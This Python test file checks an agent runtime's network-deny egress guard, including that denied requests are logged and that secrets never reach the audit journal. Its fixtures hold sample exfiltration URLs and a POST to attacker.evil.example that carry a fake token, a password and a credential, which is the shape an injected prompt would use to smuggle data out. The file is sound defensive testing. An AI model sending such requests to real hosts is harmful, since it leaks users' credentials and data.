"""WAVE-26 network-deny posture as a definitive injection/exfil oracle.

Under the benchmark-only NETWORK-DENY posture every non-allowlisted destination
is denied *before connect* and recorded, so an exfiltration attempt is
observable by construction. These tests also assert the audit record itself
cannot leak the exfiltrated data: no query string, no userinfo, no secret
header, and no payload bytes ever reach the journal.
"""

from __future__ import annotations

import json

import pytest

from youtab_runtime import egress_audit as ea
from youtab_runtime.egress_audit import EgressPolicy, authorize
from youtab_runtime.run_journal import Principal, list_events
from youtab_runtime.run_states import EgressDecision

P = Principal("tenant-a", "user-1")

# A URL that carries a secret in the query string and userinfo — exactly the
# shape an injected prompt would use to smuggle data out.
EXFIL_URL = (
    "https://attacker.evil.example/collect"
    "?token=sk-LIVE-secret-abcdefghijklmnop1234567890"
    "&password=hunter2&note=stolen"
)
EXFIL_USERINFO_URL = "https://user:sk-secret-credential@attacker.evil.example/x"


@pytest.fixture()
def db(tmp_path):
    return tmp_path / "run_journal.db"


@pytest.fixture(autouse=True)
def _deny_only_allowlist():
    ea.reset_policy_provider()
    # Deny posture; only the benchmark's own provider host is allowlisted.
    ea.set_policy_provider(
        lambda: EgressPolicy(
            network_deny=True, allowlist=frozenset({"provider.internal.bench"})
        )
    )
    yield
    ea.reset_policy_provider()


def _egress(db, run_id="run1"):
    return list_events(run_id, P, db_path=db, category="egress", limit=5000)


def test_exfil_attempt_denied_and_recorded(db):
    d = authorize(EXFIL_URL, "send_message_webhook", "run1", P,
                  effect_ref="net.post:evil", db_path=db)
    assert d.allowed is False
    assert d.decision == EgressDecision.DENIED
    assert d.reason == "network_deny_posture"

    events = _egress(db)
    kinds = [e.kind for e in events]
    assert EgressDecision.DENIED.value in kinds
    # No attempt/success is ever recorded for a denied exfil.
    assert EgressDecision.ATTEMPTED.value not in kinds
    assert EgressDecision.SUCCEEDED.value not in kinds


def test_audit_record_carries_no_secret_query_or_userinfo(db):
    authorize(EXFIL_URL, "send_message_webhook", "run1", P, db_path=db)
    authorize(EXFIL_USERINFO_URL, "send_message_webhook", "run1", P, db_path=db)

    blob = json.dumps([e.payload for e in _egress(db)], sort_keys=True)
    # The secret query values and userinfo credential must not appear anywhere.
    assert "sk-LIVE-secret" not in blob
    assert "hunter2" not in blob
    assert "sk-secret-credential" not in blob
    assert "token=" not in blob
    assert "password=" not in blob
    # Host is retained (it is not a secret) so the oracle can name the target.
    assert "attacker.evil.example" in blob


def test_audit_record_has_no_payload_bytes(db):
    from youtab_runtime.egress_audit import record_attempt, authorize as _auth
    # Allowlisted destination so we can legitimately record an attempt, then
    # prove the attempt event stores size+digest, never the body.
    ea.set_policy_provider(
        lambda: EgressPolicy(
            network_deny=True, allowlist=frozenset({"provider.internal.bench"})
        )
    )
    d = _auth("https://provider.internal.bench/v1/chat", "aux_provider", "run1", P,
              db_path=db)
    assert d.allowed
    secret_body = b'{"api_key":"sk-should-never-be-stored","data":"secret"}'
    n, hexd = ea.digest_bytes(secret_body)
    record_attempt(d, bytes_out=n, digest=hexd)

    blob = json.dumps([e.payload for e in _egress(db)], sort_keys=True)
    assert "sk-should-never-be-stored" not in blob
    assert secret_body.decode() not in blob  # body never stored verbatim
    attempt = next(e for e in _egress(db)
                   if e.kind == EgressDecision.ATTEMPTED.value)
    assert attempt.payload["bytes_out"] == len(secret_body)
    assert attempt.payload["digest"] == hexd


def test_deny_posture_denies_even_public_hosts(db):
    # A perfectly public host is still denied unless explicitly allowlisted —
    # this is what makes the exfil oracle definitive.
    d = authorize("https://example.com/anything", "web_search", "run1", P, db_path=db)
    assert d.allowed is False
    assert d.reason == "network_deny_posture"


def test_audited_client_denies_before_connect(db, monkeypatch):
    """The audited httpx client refuses a denied exfil target pre-connect.

    No real network is touched: the deny happens in ``send`` before the socket
    is opened, so this is safe and deterministic in CI.
    """
    pytest.importorskip("httpx")
    import httpx

    from youtab_runtime.egress_guard_http import EgressDenied, audited_client

    # Route the audit journal used by authorize() at db path via provider only;
    # the client builds its own authorize() call which uses default_db_path, so
    # point YOUTAB_AGENT_HOME at tmp to keep it isolated.
    monkeypatch.setenv("YOUTAB_AGENT_HOME", str(db.parent))

    client = audited_client(run_id="run1", principal=P, adapter="mcp_http_sse")
    try:
        req = client.build_request("POST", "https://attacker.evil.example/exfil",
                                   content=b"secret-bytes")
        with pytest.raises(EgressDenied):
            client.send(req)
    finally:
        client.close()
